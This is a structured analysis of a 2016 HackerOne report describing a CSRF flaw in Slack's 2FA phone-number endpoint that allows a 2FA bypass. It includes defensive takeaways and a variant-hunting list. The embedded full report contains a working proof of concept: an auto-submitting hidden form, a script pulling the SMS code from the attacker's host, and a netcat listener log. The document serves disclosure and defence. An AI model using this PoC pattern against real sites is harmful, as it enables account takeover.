# CSRF - Add Optional Two Factor Mobile Number

## Metadata
- **Source:** HackerOne
- **Report:** 155774 | https://hackerone.com/reports/155774
- **Submitted:** 2016-08-01
- **Reporter:** nhavis
- **Program:** Slack
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Cross-Site Request Forgery (CSRF), Missing CSRF Token Validation, Authentication Bypass
- **CVEs:** None
- **Category:** web-api

## Summary
The 2FA SMS registration endpoint at /account/settings/2fa_sms fails to validate CSRF tokens, allowing attackers to add attacker-controlled phone numbers to a victim's 2FA settings. Combined with SMS interception or attacker phone number injection, this completely bypasses 2FA security, enabling unauthorized account takeover.

## Attack scenario
1. Attacker crafts malicious HTML/JavaScript page containing hidden form that submits to the vulnerable 2FA endpoint without CSRF token
2. Attacker sends link to logged-in Slack user via phishing or social engineering; victim's browser automatically submits the form due to existing session cookies
3. The malicious JavaScript establishes callback to attacker's server to receive the SMS verification code
4. Attacker receives SMS code sent to their injected phone number and sends code back to victim's browser via JavaScript
5. Victim's browser automatically submits verification form with attacker's code, registering attacker's phone number as verified 2FA method
6. Attacker logs into victim's account and requests 2FA code be sent to the newly registered attacker phone number, completely bypassing 2FA

## Root cause
Server-side validation of the 'crumb' CSRF token parameter is missing or not enforced on the /account/settings/2fa_sms endpoint. The application accepts form submissions without verifying the CSRF token exists or matches the user's session.

## Attacker mindset
Attacker recognized that 2FA registration endpoints are often overlooked in CSRF protections since they appear to be account security features. By chaining CSRF with the ability to receive SMS codes (via phone number control or interception), the attacker can completely neutralize 2FA and gain persistent account access even if the original password is compromised.

## Defensive takeaways
- Implement mandatory CSRF token validation on ALL state-changing endpoints, including security-sensitive operations like 2FA configuration
- Apply consistent CSRF protection framework across all sensitive endpoints; do not assume security features are inherently protected
- Require additional authentication (password re-entry or email verification) before allowing 2FA method changes, not just CSRF tokens
- Implement rate limiting and anomaly detection on 2FA registration to detect suspicious multiple additions
- Send notifications to user's email and existing verified phone numbers when new 2FA methods are added
- Consider requiring SameSite cookie attributes (Strict/Lax) to prevent cross-site cookie transmission
- Log all 2FA configuration changes with IP address and user agent for audit trails

## Variant hunting
Check other security-critical endpoints (password reset, email change, trusted devices, API keys) for missing CSRF protection
Test backup code generation and recovery email modification endpoints for similar CSRF vulnerabilities
Look for CSRF protection bypass techniques: missing origin/referer validation, token fixation, token reuse across users
Hunt for similar patterns in OAuth/SSO integration endpoints and account linking features
Test POST endpoints that accept both form-encoded and JSON content types for inconsistent CSRF validation
Check if CSRF tokens are properly scoped per-user per-session or if tokens can be reused/shared

## MITRE ATT&CK
- T1190
- T1566.002
- T1556
- T1098.001

## Notes
This is a sophisticated attack chain that exploits the assumption that security features like 2FA endpoints are inherently protected. The PoC demonstrates that CSRF + SMS code interception creates a complete authentication bypass. The report was filed against Slack's corporate variant (cs-sa.slack.com). The attacker skillfully identified that SMS codes could be exfiltrated via JavaScript callback, making this a practical end-to-end attack rather than theoretical. The vulnerability is particularly severe because it allows attackers who already have the password (from phishing, data breaches, or internal access) to permanently lock legitimate users out while maintaining access.

## Full report
<details><summary>Expand</summary>

Description
====================
Adding a mobile number for 2-factor authentication is vulnerable to CSRF, allowing an attacker to bypass 2-factor authentication. An attacker would be able to force the logged in user to add a new mobile number for 2-factor authentication. The attacker would then receive the SMS code and automatically make the victim verify it (in Javascript). When the attacker attempts to login to the victim's account, the verification code can then be sent to the attacker's mobile number. 

An attacker could be anyone trying to bypass 2-factor authentication, for example:
1. Anyone who already has the password to an account.
2. A company's IT administrator who has access to the user's e-mail and can reset the password.

I have provided a complete Proof of Concept without the **crumb** parameter, which I have manually verified myself.

Vulnerable URL:
====================
* /account/settings/2fa_sms

Root cause:
====================
Server does not validate the existence or value of the **crumb** parameter containing the CSRF token.

Sample vulnerable request:
====================
```
POST /account/settings/2fa_sms HTTP/1.1
Host: cs-sa.slack.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Cookie: REDACTED=REDACTED
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 109

verify_two_factor=1&backup=&app=&primary_phone_number=%2B61+0████████&country_code=AU&phone_number=█████████
```

Attack flow:
====================
1. Attacker sends logged in slack user a link and slack user clicks it.
2. The link contains HTML and Javascript code that forces the victim in to adding a new 2-factor mobile number (**slackcsrf.html** provided below). The code does not contain the **crumb** parameter.
3. The code also connects back to the attacker's machine waiting for the attacker to enter the code so it can be used for verification (within seconds and potentially automatically).
4. The attacker receives the code via SMS and sends it back to the victim. (**Attacker web server** provided below)
5. The HTML code forces the victim to verify the new mobile number.
6. The mobile number has now been added to the victim's account for 2FA.
7. The attacker logs in and bypasses 2FA by requesting the code with the secondary mobile number.

slackcsrf.html:
---------------------
```
<html>
<body>
<IFRAME style="display:none" name="hidden-form"></iframe>
    <form action="https://cs-sa.slack.com/account/settings/2fa_sms" method="POST" target="hidden-form" name="pocframe">
      <input type="hidden" name="verify&#95;two&#95;factor" value="1" />
      <input type="hidden" name="backup" value="" />
      <input type="hidden" name="app" value="" />
      <input type="hidden" name="country&#95;code" value="AU" />
      <input type="hidden" name="phone&#95;number" value="█████████" />
    </form>
<script>document.pocframe.submit();</script>

<script src="http://192.168.1.82:8080/a"></script>
<IFRAME style="display:none" name="hidden-form2"></iframe>
    <form action="https://cs-sa.slack.com/account/settings/2fa_sms" method="POST" target="hidden-form2" name="pocframe2">
      <input type="hidden" name="verify&#95;two&#95;factor" value="1" />
      <input type="hidden" name="backup" value="1" />
      <input type="hidden" name="app" value="" />
      <input type="hidden" name="formatted&#95;phone&#95;number" value="&#43;61&#32;████████" />
      <input type="hidden" name="country&#95;code" value="AU" />
      <input type="hidden" id="scode" name="confirmation&#95;code" value="" />
    </form>
<script>
	document.getElementById("scode").value = scode;
	document.pocframe2.submit();
</script>
</body>
</html>
```

Attacker web server:
---------------------
```
root@foxtrotter:/var/www/html# nc -nlvp 8080
listening on [any] 8080 ...
connect to [192.168.1.82] from (UNKNOWN) [192.168.1.81] 56194
GET /a HTTP/1.1
Host: 192.168.1.82:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.82/slackcsrf.html
Connection: close
Cache-Control: max-age=0

HTTP/1.1 200 OK

scode=196206;
```


</details>

---
*Analysed by Claude on 2026-05-24*
